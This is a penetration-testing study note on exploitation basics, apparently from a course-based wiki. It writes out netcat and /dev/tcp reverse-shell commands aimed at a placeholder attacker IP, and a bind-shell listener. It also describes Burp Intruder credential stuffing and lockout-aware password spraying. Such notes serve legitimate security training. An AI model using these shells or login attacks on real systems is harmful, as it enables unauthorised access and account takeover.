# Exploitation (Basics)

## Shells

### Reverse shell

![image](https://user-images.githubusercontent.com/96747355/175835538-b00ec472-e4b3-4688-b062-25d37837b8b1.png)  
Source:[hackingtutorials.org](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)
- The target connects back to us
- Example 
  - in our attacking machine we type `nc -nlvp 4444` (4444 is the port) 
  - in our target we connect be. For instance in case of a linux based machine we can do `netcat ATTACKING-MACHINE-IP 4444 -e /bin/bash` we could also use `/bin/bash -i >& /dev/tcp/ATTACKING-MACHINE-IP/4444 0>&1`

### Bind shell

![image](https://user-images.githubusercontent.com/96747355/175835567-7bb7a51d-7761-4cc8-983a-cc7087dacaac.png)  
Source:[hackingtutorials.org](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)

- We connect to the target
- Example
  - in our target we can do `nc -nlvp 4444 -e /bin/bash`
  - in our attacking machine we can do `nc TARGET-IP 4444`

## Payloads

![image](https://user-images.githubusercontent.com/96747355/175836279-e0f0e004-c75a-4d8e-b4de-9680e1b5306a.png)  
Source:[TCM Academy](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)

- If one type of payload does not work we can try the other one

## Bruteforce attacks

- Check out how to use hydra [here](/Tools/passwords-tools.md#hydra)
- We can also use metasploit that has multiple modules for bruteforce attacks

## Credentials stuffing and password spraying

- Methodology
  - Use leaked creds found during the enumeration phase on the login portals found during the enumeration phase
- The goal of credentials stuffing and password spraying is to taking these credentials and throwing them at a website
- We can use burp intruder for this
  - First we can see what we get when a login fails, and copy the string we get back
  - We send the login portal to intruder and we add the login and password as variables
  - We use a pitchfork attack
  - We make a grep-match on the string previously copied 
  - Then in the payloads we take the list of users for the variable that corresponds to user and the list of passwords for the one that corresponds to the password. And then we just launch the attack.
  - In the results we will see the ones that are not valid with our grep match. We can also check the response (301 is redirect for example) and the size of the paylaod (if it is really different in one of the results
- Password spraying: We can also try an attack with one password and try out multiple usernames
  - Caution here, checkout prior to your engagement if a lockout is in place how many tried before being locked out. When we know this we can then setup our attack to try something every hour or so.

## Resources

{% embed url="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/" %}Hacking Tutorials{% endembed %}
{% embed url="https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course" %} Practical Ethical Hacking - TCM Security {% endembed %}
